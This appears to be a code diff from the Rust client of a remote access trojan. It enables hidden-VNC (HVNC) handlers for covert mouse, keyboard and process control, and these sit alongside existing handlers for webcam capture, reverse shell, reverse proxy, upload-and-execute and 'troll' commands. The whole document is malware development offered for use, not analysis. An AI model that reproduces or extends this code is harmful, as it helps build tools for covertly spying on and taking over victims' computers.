@@ -4,7 +4,7 @@ use crate::features::remote_desktop::{take_screenshot, start_remote_desktop, sto
 use crate::features::process::{process_list, kill_process, start_process, suspend_process, resume_process};
 use crate::features::fun::execute_troll_command;
 use crate::features::webcam::take_webcam;
-// use crate::features::hvnc::{start_hvnc, stop_hvnc, open_process};
+use crate::features::hvnc::{start_hvnc, stop_hvnc, hvnc_start_process, hvnc_mouse_click, hvnc_keyboard_input};
 use common::packets::*;
 use rand_chacha::ChaCha20Rng;
 use tokio::sync::oneshot;
@@ -112,11 +112,15 @@ pub async fn reading_loop(
 
             Ok(Some(ClientboundPacket::RequestWebcam)) => take_webcam().await,
             
-            // Ok(Some(ClientboundPacket::StartHVNC)) => start_hvnc(),
+            Ok(Some(ClientboundPacket::StartHVNC(config))) => start_hvnc(config),
             
-            // Ok(Some(ClientboundPacket::StopHVNC)) => stop_hvnc(),
+            Ok(Some(ClientboundPacket::StopHVNC)) => stop_hvnc(),
             
-            // Ok(Some(ClientboundPacket::OpenExplorer)) => open_process("explorer.exe"),
+            Ok(Some(ClientboundPacket::HVNCMouseClick(data))) => hvnc_mouse_click(data),
+
+            Ok(Some(ClientboundPacket::HVNCKeyboardInput(data))) => hvnc_keyboard_input(data),
+
+            Ok(Some(ClientboundPacket::HVNCStartProcess(path))) => hvnc_start_process(path),
             
             Ok(Some(ClientboundPacket::UploadAndExecute(file_data))) => file_manager.upload_and_execute(file_data).await,
             
@@ -135,7 +139,7 @@ pub async fn reading_loop(
                 reverse_shell_lock.send_shell_command(b"exit");
                 reverse_proxy.stop().await;
                 stop_remote_desktop();
-                // stop_hvnc();
+                stop_hvnc();
                 close_sender.send(()).unwrap_or_else(|_| println!("Failed to send close signal"));
                 break 'l;
             }
@@ -145,7 +149,7 @@ pub async fn reading_loop(
                 reverse_shell_lock.send_shell_command(b"exit");
                 reverse_proxy.stop().await;
                 stop_remote_desktop();
-                // stop_hvnc();
+                stop_hvnc();
                 close_sender.send(()).unwrap_or_else(|_| println!("Failed to send close signal"));
                 break 'l;
             }
